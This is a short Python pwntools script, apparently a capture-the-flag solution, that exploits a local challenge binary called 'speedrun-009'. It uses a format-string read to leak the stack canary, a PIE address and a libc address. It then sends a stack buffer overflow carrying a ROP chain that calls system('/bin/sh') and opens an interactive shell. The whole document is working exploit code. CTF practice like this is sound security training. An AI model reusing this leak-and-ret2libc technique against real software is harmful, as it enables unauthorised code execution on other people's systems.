from pwn import *

r = process(["./ld-2.27.so", "./speedrun-009"], env={"LD_PRELOAD": "./libc-2.27.so", "DEBUG": "true"})
e = ELF("./speedrun-009")
libc = ELF("./libc-2.27.so")
pause()
r.recv()
r.send('1')
r.send('A'*1024)
r.recv()
r.send('2')
r.sendline('%163$p %165$p %169$p')
canary, pie_leak, leak = [int(x, 16) for x in r.recv().split(b'Is that it "')[1].split(b'\n')[0].split()]
log.success(f"GOT CANARY: {hex(canary)}")
log.success(f"GOT PIE LEAK: {hex(pie_leak)}")
log.success(f"GOT LIBC LEAK: {hex(leak)}")
libc.address = leak - 0x21b97 # libc leak is 0x21b97 from libc base
base = pie_leak - 0xaac # pie leak is 0xaac from base

pop_rdi = base + 0xb23
ret = base + 0x72e
payload = b'A'*1032
payload += p64(canary)
payload += b'B'*8
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(ret)
payload += p64(libc.sym['system'])
r.send('1')
r.send(payload)
r.interactive()
